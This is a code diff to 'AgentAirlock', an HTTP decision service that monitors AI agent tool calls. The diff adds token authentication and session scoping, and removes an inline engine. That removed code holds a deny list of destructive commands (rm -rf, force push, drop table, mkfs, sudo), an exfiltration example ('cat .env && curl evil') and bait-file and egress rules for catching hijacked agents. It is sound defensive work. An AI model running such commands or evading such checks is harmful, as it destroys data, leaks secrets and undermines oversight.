@@ -17,160 +17,23 @@ import argparse
 import json
 import os
 import sys
-import time
+import secrets
+from dataclasses import asdict
+from urllib.parse import urlsplit, parse_qs
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 _APP = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 if _APP not in sys.path:
     sys.path.insert(0, _APP)
 
-from provenance import (  # noqa: E402
-    ActionProps, Channel, ContextEntry, GraphStore, Kind, Labeler, Op,
-    Sensitivity, SqliteStore, Trust, new_entry_id,
-)
-import provenance.command as cmdparse  # noqa: E402
-from monitor.daemon import default_policy, resolve_origin  # noqa: E402
+from provenance import SqliteStore
 
-ACTION_OPS = {"WriteFile", "DeleteFile", "RunCommand", "NetworkRequest", "CallTool"}
-_OP = {
-    "ReadFile": Op.READ_FILE, "WriteFile": Op.WRITE_FILE, "DeleteFile": Op.DELETE_FILE,
-    "RunCommand": Op.RUN_COMMAND, "NetworkRequest": Op.NETWORK_REQUEST, "CallTool": Op.CALL_TOOL,
-}
-_DESTRUCTIVE = ("rm -rf", "rm -r ", "git push --force", "git push -f", "drop table", "mkfs", "sudo ")
+from engine import Brain
 
 
-class Brain:
-    """The decision engine: label -> append to graph -> trace_back -> decide."""
-
-    def __init__(self, store=None) -> None:
-        self.store = store if store is not None else GraphStore()
-        self.labeler = Labeler(default_policy())
-        self.killed: set[str] = set()
-        self._seq: dict[str, int] = {}
-
-    def _next_id(self, session: str) -> str:
-        self._seq[session] = self._seq.get(session, 0) + 1
-        return new_entry_id(session, self._seq[session])
-
-    def _is_killed(self, session: str) -> bool:
-        if session in self.killed:
-            return True
-        checker = getattr(self.store, "is_killed", None)
-        return bool(checker(session)) if checker else False
-
-    def kill(self, session: str) -> None:
-        self.killed.add(session)
-        store_kill = getattr(self.store, "kill", None)   # persist the kill (SqliteStore)
-        if store_kill:
-            store_kill(session)
-
-    def _append(self, session, op, target, labels, kind, action_props, origin):
-        e = ContextEntry(id=self._next_id(session), ts=time.time(), session_id=session, kind=kind,
-                         channel=Channel.HOOK, op=op, target=target, origin=origin,
-                         labels=labels, action_props=action_props)
-        self.store.append(e)
-        return e
-
-    def _decide_bash(self, session, cmd):
-        """Evaluate the file reads and outbound connections a shell command
-        performs. Returns a verdict dict if the command is dangerous, else None."""
-        # 1. record untrusted/secret file reads the command references (provenance)
-        for raw in cmdparse.file_tokens(cmd):
-            ftok = raw if raw.startswith("/") else "/" + raw  # relative -> absolute for glob/marker match
-            origin = resolve_origin("ReadFile", ftok)
-            lbl = self.labeler.label(ftok, origin)
-            if lbl.bait or self.labeler.is_bait_target("RunCommand", ftok, cmd):
-                self.kill(session)
-                return _v("stop", "bait_touched", "bait file referenced in shell command", 1.0)
-            if lbl.sensitivity == Sensitivity.SECRET or lbl.effective_trust == Trust.UNTRUSTED:
-                kind = Kind.SECRET if lbl.sensitivity == Sensitivity.SECRET else Kind.SOURCE
-                self._append(session, Op.READ_FILE, ftok, lbl, kind, None, origin)
-        # 2. outbound connections inside the command (curl/wget/...)
-        for host in cmdparse.hosts_in(cmd):
-            if not self.labeler.approved_host(host):
-                ne = self._append(session, Op.NETWORK_REQUEST, host,
-                                  self.labeler.label(host, "web"), Kind.ACTION,
-                                  ActionProps(is_exit=True), "web")
-                agg = self.store.aggregate(session, ne)
-                if agg.reached_secret:
-                    return _v("block", "secret_exit",
-                              "secret data reaching an unapproved exit (shell)", agg.confidence)
-                if agg.reached_untrusted:
-                    return _v("block", "lethal_trifecta",
-                              "untrusted input reaching an unapproved exit (shell)", agg.confidence)
-                return _v("block", "egress_allowlist",
-                          "shell command exits to an unapproved host", 1.0)
-        return None
-
-    def decide(self, req: dict) -> dict:
-        session = req.get("session_id") or "unknown"
-        op = req.get("op") or "ReadFile"
-        target = req.get("target") or ""
-        args = req.get("args") or {}
-
-        if self._is_killed(session):
-            return _v("stop", "session_killed", "session already terminated", 1.0)
-
-        origin = req.get("origin") or resolve_origin(op, target)
-        labels = self.labeler.label(target, origin)
-        is_action = op in ACTION_OPS
-        if not is_action and labels.sensitivity == Sensitivity.SECRET:
-            kind = Kind.SECRET
-        elif is_action:
-            kind = Kind.ACTION
-        else:
-            kind = Kind.SOURCE
-
-        blob = " ".join(str(x) for x in args.values())
-        bait = labels.bait or self.labeler.is_bait_target(op, target, blob)
-
-        action_props = None
-        if is_action:
-            is_exit = op == "NetworkRequest" and not self.labeler.approved_host(target)
-            destructive = op == "RunCommand" and any(p in blob.lower() for p in _DESTRUCTIVE)
-            action_props = ActionProps(is_exit=is_exit, is_destructive=destructive)
-
-        entry = ContextEntry(
-            id=self._next_id(session), ts=time.time(), session_id=session, kind=kind,
-            channel=Channel.HOOK, op=_OP[op], target=target, origin=origin,
-            labels=labels, action_props=action_props,
-        )
-        self.store.append(entry)
-
-        # bait is checked on every event: touching it = confirmed compromise
-        if bait:
-            self.kill(session)
-            return _v("stop", "bait_touched", "bait/canary accessed -> hijack confirmed", 1.0)
-
-        if not is_action:
-            return _v("allow", "read_recorded", "context read; labeled and recorded", 1.0)
-
-        # Decompose a Bash command into the actions it performs (reads + exits),
-        # so a single `cat .env && curl evil` is not opaque to the guard.
-        if op == "RunCommand":
-            sub = self._decide_bash(session, str(args.get("command") or target or ""))
-            if sub is not None:
-                return sub
-
-        agg = self.store.aggregate(session, entry)   # trace_back over the graph
-        c = agg.confidence
-        if agg.reached_secret and action_props.is_exit:
-            return _v("block", "secret_exit", "secret data reaching an unapproved exit", c)
-        if agg.reached_untrusted and action_props.is_exit:
-            return _v("block" if c >= 0.4 else "ask", "lethal_trifecta",
-                      "untrusted input reaching an unapproved exit", c)
-        if agg.reached_untrusted and action_props.is_destructive:
-            return _v("block" if c >= 0.4 else "ask", "untrusted_destructive",
-                      "untrusted input driving a destructive action", c)
-        if action_props.is_exit:
-            return _v("block", "egress_allowlist", "exit to an unapproved host", 1.0)
-        return _v("allow", "no_dangerous_flow", "no dangerous provenance detected", 1.0)
-
-
-def _v(decision: str, rule: str, reason: str, confidence: float) -> dict:
-    return {"decision": decision, "rule": rule, "reason": reason, "confidence": round(confidence, 2)}
-
-
+ADMIN_TOKEN = os.environ.get("AIRLOCK_ADMIN_TOKEN")
+SENSOR_TOKEN = os.environ.get("AIRLOCK_SENSOR_TOKEN")
+MANAGED_SESSION = os.environ.get("AIRLOCK_SESSION")
 BRAIN = Brain()
 
 
@@ -183,26 +46,73 @@ class _Handler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(body)
 
+    def _authorized(self, sensor=False):
+        if not ADMIN_TOKEN:
+            return True
+        value = self.headers.get('Authorization', '')
+        tokens = [ADMIN_TOKEN] + ([SENSOR_TOKEN] if sensor and SENSOR_TOKEN else [])
+        return any(secrets.compare_digest(value, 'Bearer ' + token) for token in tokens)
+
     def do_GET(self):
+        if self.path != '/health' and not self._authorized():
+            self._send(401, {'error':'operator authentication required'})
+            return
         if self.path == "/health":
             self._send(200, {"ok": True})
+        elif self.path == '/status':
+            sid = MANAGED_SESSION
+            self._send(200, {'session_id':sid,'status':'KILLED' if sid and BRAIN._is_killed(sid) else 'ACTIVE'})
+        elif self.path == '/sessions':
+            self._send(200, {'sessions':BRAIN.sessions()})
+        elif urlsplit(self.path).path == '/entries':
+            sid = parse_qs(urlsplit(self.path).query).get('session_id',[MANAGED_SESSION])[0]
+            self._send(200, {'entries':[asdict(e) for e in BRAIN.store.get_entries(sid)]})
+        elif urlsplit(self.path).path == "/events":
+            session = parse_qs(urlsplit(self.path).query).get("session_id", [MANAGED_SESSION])[0]
+            self._send(200, {"events": BRAIN.events(session, int(parse_qs(urlsplit(self.path).query).get("after", ["0"])[0]))})
         else:
             self._send(404, {"error": "not found"})
 
     def do_POST(self):
+        if not self._authorized(sensor=self.path in ('/decide','/complete','/network','/enforcement')):
+            self._send(401, {'error':'authentication required'})
+            return
         n = int(self.headers.get("Content-Length") or 0)
+        if n > 262144:
+            self._send(413, {'error':'request too large'})
+            return
         raw = self.rfile.read(n) if n else b"{}"
         try:
             req = json.loads(raw or b"{}")
         except json.JSONDecodeError:
-            req = {}
-        if self.path == "/decide":
+            self._send(400, {"error": "invalid JSON"})
+            return
+        if not isinstance(req, dict):
+            self._send(400, {"error": "JSON object required"})
+            return
+        if MANAGED_SESSION:
+            if req.get('session_id') != MANAGED_SESSION:
+                self._send(403, {'error':'session scope mismatch'})
+                return
+            req.pop('origin', None)
+        if self.path == '/enforcement':
+            self._send(200,BRAIN.acknowledge_denial(req))
+        elif self.path == '/network':
+            from mediated_network import perform
+            self._send(200,perform(BRAIN,req))
+        elif self.path == "/complete":
+            self._send(200, BRAIN.complete(req))
+        elif self.path == "/decide":
+            req["phase"] = "before"
             verdict = BRAIN.decide(req)
             print(f"[decide] {str(req.get('op')):14s} {str(req.get('target'))[:60]:60s} "
                   f"-> {verdict['decision'].upper():5s} ({verdict['rule']})", flush=True)
             self._send(200, verdict)
         elif self.path == "/kill":
-            BRAIN.kill(req.get("session_id") or "")
+            if not isinstance(req.get("session_id"), str) or not req["session_id"]:
+                self._send(400, {"error": "session_id required"})
+                return
+            BRAIN.kill(req["session_id"])
             self._send(200, {"ok": True})
         else:
             self._send(404, {"error": "not found"})
@@ -213,13 +123,15 @@ class _Handler(BaseHTTPRequestHandler):
 
 def main(argv=None) -> int:
     ap = argparse.ArgumentParser(description="AgentAirlock decision service")
+    ap.add_argument("--policy", default=None)
     ap.add_argument("--port", type=int, default=8787)
     ap.add_argument("--db", default=None,
                     help="persist to a SQLite DB (William-compatible) instead of in-memory graph")
     a = ap.parse_args(argv)
     global BRAIN
     if a.db:
-        BRAIN = Brain(store=SqliteStore(a.db))
+        from provenance import Policy
+        BRAIN = Brain(store=SqliteStore(a.db), policy=Policy.load(a.policy) if a.policy else None)
         print(f"AgentAirlock: persisting provenance to {a.db}", flush=True)
     srv = ThreadingHTTPServer(("127.0.0.1", a.port), _Handler)
     print(f"AgentAirlock decision service on http://127.0.0.1:{a.port} "
